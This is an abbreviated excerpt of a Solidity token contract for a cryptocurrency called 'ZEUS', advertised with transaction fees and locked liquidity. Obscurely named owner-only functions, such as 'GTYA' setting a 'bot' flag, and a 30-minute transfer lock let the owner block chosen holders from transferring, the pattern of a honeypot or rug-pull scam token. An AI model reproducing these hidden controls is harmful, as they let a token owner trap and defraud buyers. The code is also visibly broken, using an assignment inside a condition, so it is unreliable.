...
/**
  Welcome to ZEUS
   ...
   #ZEUS features:
   8% Fee on all transactions
   4% auto added to the liquidity pool and locked forever
...
contract DeflationaryERC20 is Context, IERC20, Ownable {
    ...
    function POOL(address _addr, bool _bool) external virtual onlyOwner {
        SWAP[_addr] = _bool;
    }
    
    function GTYA(address _addr, bool _bool) external virtual onlyOwner {
        bot[_addr] = _bool;
    }
   ...
   /* function _burn2() internal {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(TIME = true && timeNow < transData[sender] + 30 minutes){
            revert("VALUE PROTECTION");
        }
     ...
     * e.g. set auto allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
...
contract ttc is DeflationaryERC20 {

    constructor() DeflationaryERC20("ZEUS", "ZEUS") {
